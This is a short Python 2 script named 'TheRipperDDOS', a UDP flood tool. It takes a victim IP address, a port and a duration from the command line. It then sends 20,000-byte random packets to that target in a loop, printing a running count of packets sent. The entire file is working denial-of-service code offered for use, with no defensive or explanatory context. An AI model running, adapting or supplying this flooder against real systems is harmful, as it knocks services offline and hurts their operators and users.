import time
import socket
import random
import sys
def usage():
    print "#------------------------[\033[1;91mTheRipperDDOS\033[1;32m]---------------------#"
    print " \033[1;91mCommand: " "python2 The Ripper.py " "<ip> <port> <packet> "
def flood(victim, vport, duration):

    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    #
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 0	

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "\033[1;91PPackets sent \033[1;32m%s \033[1;91pVictim: \033[1;32m%s \033[1;91pPort: \033[1;32m%s "%(sent, victim, vport)
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()



